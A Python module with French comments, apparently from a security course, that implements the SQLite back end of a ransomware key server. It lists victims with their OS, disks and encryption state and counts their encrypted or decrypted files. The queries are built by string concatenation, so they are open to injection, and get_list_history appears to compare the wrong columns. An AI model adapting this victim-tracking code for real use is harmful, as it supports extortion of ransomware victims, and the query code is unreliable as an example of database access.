import sqlite3

# Constantes
DB_FILENAME = '../serveur_cles/data/victims.sqlite'


def connect_db():
    """
    Initialise la connexion vers la base de donnée
    :return: La connexion établie avec la base de donnée
    """
    connexion = sqlite3.connect(DB_FILENAME)
    if connexion:
        print('Connexion avec la DB effectué')
    return connexion


def insert_data(conn, table, items, data):
    """
    Insère des données de type 'items' avec les valeurs 'data' dans la 'table' en utilisant la connexion 'conn' existante
    :param conn: la connexion existante vers la base de donnée
    :param table: la table dans laquelle insérer les données
    :param items: le nom des champs à insérer
    :param data: la valeur des champs à insérer
    :return: Néant
    """
    insert = "INSERT INTO " + table + " " + items + " VALUES " + data
    cursor = conn.cursor()
    cursor.execute(insert)
    conn.commit()
    cursor.close()


def select_data(conn, select_query):
    """
    Exécute un SELECT dans la base de donnée (conn) et retourne les records correspondants
    :param conn: la connexion déjà établie à la base de donnée
    :param select_query: la requête du select à effectuer
    :return: les records correspondants au résultats du SELECT
    """
    cursor = conn.cursor()
    cursor.execute(select_query)
    records = cursor.fetchall()
    cursor.close()
    return records


def get_list_victims(conn):
    """
    Retourne la liste des victimes présente dans la base de donnée
    (N'oubliez pas de vous servir de la fonction précédente pour effectuer la requête)
    :param conn: la connexion déjà établie à la base de donnée
    :return: La liste des victimes
    """
    query = '''
    SELECT victims.id_victim, victims.hash, victims.os, victims.disks, last_states.last_state  
    FROM (SELECT id_victim, MAX(datetime), state AS last_state
    FROM states
    GROUP BY id_victim) AS last_states
    INNER JOIN victims ON victims.id_victim = last_states.id_victim
        '''
    victims = select_data(conn, query)  # victims[n][victims.id_victim, victims.hash, victims.os, victims.disks, last_states.last_state ]

    # victims_list contient la liste de toutes les victimes (id_victim, hash, os, disks, state, nb_files)
    i = 0
    victims_list = []
    for victim in victims:
        victims_list.append(list(victim))
        if victim[4] == 'CRYPT' or victim[4] == 'PENDING':
            query = f'''
                SELECT encrypted.nb_files
            FROM encrypted
            WHERE encrypted.id_victim = {victim[0]}
              AND encrypted.datetime = (SELECT MAX(datetime) 
                                          FROM encrypted 
                                         WHERE id_victim = {victim[0]})
                '''
            nb_files = select_data(conn, query)
            if nb_files:
                nb_files = nb_files[0][0]  # [(nb_files,)] --> nb_files
            else:
                nb_files = 0
            victims_list[i].append(nb_files)  # ajout du dernier nb_files encrypted
        elif victim[4] == 'DECRYPT' or victim[4] == 'PROTECTED':
            query = f'''
                 SELECT decrypted.nb_files
            FROM decrypted
            WHERE decrypted.id_victim = {victim[0]}
              AND decrypted.datetime = (SELECT MAX(datetime) 
                                          FROM decrypted 
                                         WHERE id_victim = {victim[0]})
                '''
            nb_files = select_data(conn, query)
            if nb_files:
                nb_files = nb_files[0][0]  # [(nb_files,)] --> nb_files
            else:
                nb_files = 0
            victims_list[i].append(nb_files)  # ajout du dernier nb_files decrypted
        else:
            victims_list[i].append(0)  # ajout du 0 pour le cas INITIALIZE
        i += 1

    return victims_list


def get_list_history(conn,id_victim):
    """
    Retourne l'historique correspondant à la victime 'id_victim'
    :param conn: la connexion déjà établie à la base de donnée
    :param id_victim: l'identifiant de la victime
    :return: la liste de son historique
    """
    select = f' SELECT id_state from states WHERE {id_victim} = id_state'
    list_history = select_data(conn, select)
    return list_history
